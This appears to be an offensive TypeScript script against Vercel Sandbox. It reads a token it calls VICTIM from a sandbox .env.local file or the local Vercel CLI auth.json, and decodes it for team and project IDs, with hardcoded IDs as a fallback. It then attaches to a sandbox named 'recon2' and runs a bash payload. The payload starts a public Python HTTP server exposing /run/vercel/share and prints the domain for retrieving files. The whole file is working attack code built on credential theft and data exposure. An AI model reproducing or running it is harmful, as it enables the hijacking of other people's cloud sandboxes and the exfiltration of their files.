import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
cat > /tmp/serve.py << 'PYEOF'
import http.server, os, sys
PORT = int(sys.argv[1])
os.chdir("/run/vercel/share")
handler = http.server.SimpleHTTPRequestHandler
handler.extensions_map = {".bin": "application/octet-stream"}
http.server.ThreadingHTTPServer(("0.0.0.0", PORT), handler).serve_forever()
PYEOF
nohup python3 /tmp/serve.py 3000 > /tmp/serve.log 2>&1 &
sleep 1
ss -tln | grep 3000
echo "serve-ok"
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 30_000 });
  console.log(await r.output("both"));
  console.log("DOMAIN=" + s.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });